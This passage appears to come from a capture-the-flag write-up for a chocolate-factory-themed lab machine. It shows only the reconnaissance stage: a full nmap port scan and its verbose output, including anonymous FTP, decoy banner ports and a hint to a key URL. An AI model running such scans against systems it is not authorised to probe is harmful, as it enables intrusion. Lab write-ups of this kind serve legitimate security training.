<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap 10.10.250.54 -A -p- -T4 -v

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 07:35 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 07:35
Completed NSE at 07:35, 0.00s elapsed
Initiating NSE at 07:35
Completed NSE at 07:35, 0.00s elapsed
Initiating NSE at 07:35
Completed NSE at 07:35, 0.00s elapsed
Initiating Ping Scan at 07:35
Scanning 10.10.250.54 [4 ports]
Completed Ping Scan at 07:35, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:35
Completed Parallel DNS resolution of 1 host. at 07:35, 0.05s elapsed
Initiating SYN Stealth Scan at 07:35
Scanning 10.10.250.54 [65535 ports]
Discovered open port 21/tcp on 10.10.250.54
Discovered open port 111/tcp on 10.10.250.54
Discovered open port 113/tcp on 10.10.250.54
Discovered open port 110/tcp on 10.10.250.54
Discovered open port 80/tcp on 10.10.250.54
Discovered open port 22/tcp on 10.10.250.54
Increasing send delay for 10.10.250.54 from 0 to 5 due to 282 out of 704 dropped probes since last increase.
Increasing send delay for 10.10.250.54 from 5 to 10 due to 134 out of 334 dropped probes since last increase.
SYN Stealth Scan Timing: About 5.86% done; ETC: 07:43 (0:08:18 remaining)
SYN Stealth Scan Timing: About 8.52% done; ETC: 07:47 (0:10:55 remaining)
SYN Stealth Scan Timing: About 11.27% done; ETC: 07:48 (0:11:56 remaining)
Discovered open port 118/tcp on 10.10.250.54
SYN Stealth Scan Timing: About 15.84% done; ETC: 07:48 (0:11:15 remaining)
Discovered open port 101/tcp on 10.10.250.54
SYN Stealth Scan Timing: About 20.17% done; ETC: 07:48 (0:10:33 remaining)
SYN Stealth Scan Timing: About 24.87% done; ETC: 07:48 (0:09:52 remaining)
Discovered open port 108/tcp on 10.10.250.54
Discovered open port 105/tcp on 10.10.250.54
Discovered open port 107/tcp on 10.10.250.54
SYN Stealth Scan Timing: About 30.14% done; ETC: 07:48 (0:09:12 remaining)
SYN Stealth Scan Timing: About 34.91% done; ETC: 07:48 (0:08:31 remaining)
SYN Stealth Scan Timing: About 39.90% done; ETC: 07:48 (0:07:51 remaining)
SYN Stealth Scan Timing: About 45.18% done; ETC: 07:48 (0:07:11 remaining)
Discovered open port 121/tcp on 10.10.250.54
Discovered open port 102/tcp on 10.10.250.54
SYN Stealth Scan Timing: About 50.51% done; ETC: 07:48 (0:06:29 remaining)
SYN Stealth Scan Timing: About 55.67% done; ETC: 07:48 (0:05:50 remaining)
Discovered open port 103/tcp on 10.10.250.54
Discovered open port 122/tcp on 10.10.250.54
SYN Stealth Scan Timing: About 60.74% done; ETC: 07:48 (0:05:09 remaining)
SYN Stealth Scan Timing: About 65.77% done; ETC: 07:48 (0:04:29 remaining)
SYN Stealth Scan Timing: About 70.97% done; ETC: 07:48 (0:03:49 remaining)
Discovered open port 112/tcp on 10.10.250.54
SYN Stealth Scan Timing: About 76.17% done; ETC: 07:48 (0:03:08 remaining)
Discovered open port 114/tcp on 10.10.250.54
Discovered open port 120/tcp on 10.10.250.54
SYN Stealth Scan Timing: About 81.37% done; ETC: 07:48 (0:02:26 remaining)
Discovered open port 115/tcp on 10.10.250.54
Discovered open port 109/tcp on 10.10.250.54
SYN Stealth Scan Timing: About 86.64% done; ETC: 07:48 (0:01:45 remaining)
Discovered open port 123/tcp on 10.10.250.54
SYN Stealth Scan Timing: About 91.67% done; ETC: 07:48 (0:01:05 remaining)
Discovered open port 116/tcp on 10.10.250.54
Discovered open port 125/tcp on 10.10.250.54
Discovered open port 106/tcp on 10.10.250.54
Discovered open port 100/tcp on 10.10.250.54
Discovered open port 119/tcp on 10.10.250.54
Discovered open port 104/tcp on 10.10.250.54
Discovered open port 124/tcp on 10.10.250.54
Discovered open port 117/tcp on 10.10.250.54
Completed SYN Stealth Scan at 07:48, 800.69s elapsed (65535 total ports)
Initiating Service scan at 07:48
Scanning 29 services on 10.10.250.54
Service scan Timing: About 13.79% done; ETC: 08:08 (0:16:59 remaining)
Completed Service scan at 07:51, 163.35s elapsed (29 services on 1 host)
Initiating OS detection (try #1) against 10.10.250.54
Retrying OS detection (try #2) against 10.10.250.54
Retrying OS detection (try #3) against 10.10.250.54
Retrying OS detection (try #4) against 10.10.250.54
Retrying OS detection (try #5) against 10.10.250.54
Initiating Traceroute at 07:51
Completed Traceroute at 07:51, 0.26s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 07:51
Completed Parallel DNS resolution of 2 hosts. at 07:51, 0.04s elapsed
NSE: Script scanning 10.10.250.54.
Initiating NSE at 07:51
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
NSOCK ERROR [1012.7490s] mksock_bind_addr(): Bind to 0.0.0.0:902 failed (IOD #112): Address already in use (98)
Completed NSE at 07:56, 295.62s elapsed
Initiating NSE at 07:56
Completed NSE at 07:58, 136.34s elapsed
Initiating NSE at 07:58
Completed NSE at 07:58, 0.00s elapsed
Nmap scan report for 10.10.250.54
Host is up (0.17s latency).
Not shown: 65506 closed tcp ports (reset)
Bug in dicom-ping: no string output.
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.1.243
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1631bbb51fcccc12148ff0d833b0089b (RSA)
|   256 e71fc9db3eaa44b672103ceedb1d3390 (ECDSA)
|_  256 b44502b6248ea9065f6c79448a06555e (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
100/tcp open  newacct?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
101/tcp open  hostname?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
102/tcp open  iso-tsap?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
103/tcp open  gppitnp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
104/tcp open  acr-nema?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
105/tcp open  csnet-ns?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
107/tcp open  rtelnet?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
108/tcp open  snagas?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
109/tcp open  pop2?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
110/tcp open  pop3?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
111/tcp open  rpcbind?
| fingerprint-strings: 
|   NULL, RPCCheck: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
112/tcp open  mcidas?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
113/tcp open  ident?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, LPDString, NCP, NULL, RPCCheck, SSLSessionReq, TerminalServer, TerminalServerCookie: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
114/tcp open  audionews?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
115/tcp open  sftp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
116/tcp open  ansanotify?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
117/tcp open  uucp-path?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
118/tcp open  sqlserv?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
119/tcp open  nntp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
120/tcp open  cfdptkt?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
121/tcp open  erpc?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
122/tcp open  smakynet?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
123/tcp open  ntp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
124/tcp open  ansatrader?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
125/tcp open  locus-map?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
9 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port100-TCP:V=7.93%I=7%D=3/10%Time=640AD2BF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port101-TCP:V=7.93%I=7%D=3/10%Time=640AD2BF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port102-TCP:V=7.93%I=7%D=3/10%Time=640AD2BF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port103-TCP:V=7.93%I=7%D=3/10%Time=640AD2BF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
